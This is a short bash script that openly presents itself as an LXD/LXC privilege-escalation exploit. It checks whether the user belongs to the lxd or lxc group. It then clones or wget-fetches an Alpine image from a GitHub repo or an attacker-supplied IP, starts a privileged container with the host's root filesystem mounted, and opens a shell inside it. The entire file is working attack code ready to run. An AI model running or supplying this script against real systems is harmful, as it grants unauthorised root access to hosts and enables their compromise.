#!/bin/bash

read -p "Enter your IP(only if git doesn't work) : " ip

#------------repositories------------
repo="https://github.com/lykan89/LXD-privilege-escalation.git"
readme="https://github.com/lykan89/LXD-privilege-escalation/blob/main/README.md"

#-----------exploit script-----------
exploit(){
        echo "This exploit should take less than 1 minute to execute... if not check out my github readme $readme "
        echo "Initializing..."
        if [ -z $ip ];then
                echo "----------------------Cloning Alpine------------------------"
                git clone $repo
        else
                echo "--------------------fetching from $ip-----------------------"
                wget -r -nH -np http://$ip/LXD-privilege-escalation
        fi
        cd "LXD-privilege-escalation"
        lxc image import ./alpine-v3.20*.tar.gz --alias myimg
        lxc init myimg mycontainer -c security.privileged=true
        lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
        lxc start mycontainer
        echo "----------------Privilege Escalation done-------------------"
        lxc exec mycontainer /bin/sh
}

cmd=$(id | grep "lxc\|lxd")
echo "checking vulnerability..."
if [ -z $cmd ];then
        echo "Not exploitable... no lxd/lxc group found"
else
        exploit
fi
